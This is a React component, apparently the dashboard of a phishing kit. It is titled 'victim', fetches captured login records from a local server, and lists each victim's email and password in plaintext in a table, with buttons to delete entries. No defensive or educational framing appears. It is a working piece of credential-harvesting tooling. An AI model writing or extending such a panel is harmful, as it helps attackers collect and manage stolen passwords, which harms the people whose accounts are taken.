import React, { useEffect, useState } from 'react';

const Victim = () => {
    
  const [victim,setVictim]= useState([]);
  useEffect(() => {
    fetch('http://localhost:5000/loginItem')
    .then(res => res.json())
    .then(data => setVictim(data))
  },[] )


  function deleteProduct(id) {
    console.log(id);
    fetch(`http://localhost:5000/delete/${id}`, {
      method: "DELETE",
    }).then((result) => {
      if (result) {
        alert('Services Deleted successfully');
        window.location.reload();
      
        // toast.success("Service Deleted successfully!   (reload the page)", {
        //   position: "top-right",
        //   autoClose: 5000,
        //   hideProgressBar: false,
        //   closeOnClick: true,
        //   pauseOnHover: true,
        //   draggable: true,
        //   progress: undefined,
        // });
      }
      // window.location.reload();
    });
  }

    return (
        <div>
            <div className="container">
                <div className="col-12" p-2>
                    <h1>victim{victim.length}</h1>
                    <div className="table_main">
                    <table class="table table-sm table-dark">
                    <thead>
                      <tr>
                        {/* <th scope="col">#</th> */}
                        <th scope="col">Email</th>
                        <th scope="col">Password</th>
                        <th scope="col">Delete</th>
                      </tr>
                    </thead>
               {
                   victim.map(user => (
                    
                    <tbody>
                      <tr>
                        {/* <th>*</th> */}
                        <td>{user.email}</td>
                        <td>{user.password}</td>
                        <td> <button
                        onClick={() => deleteProduct(`${user._id}`)}
                        className="btn btn-danger px-2"
                      >
                        Delete
                      </button></td>
                      </tr>
                  
                    </tbody>
                   ))
               }
                  </table>

                    </div>
                </div>
            </div>
        </div>
    );
};

export default Victim;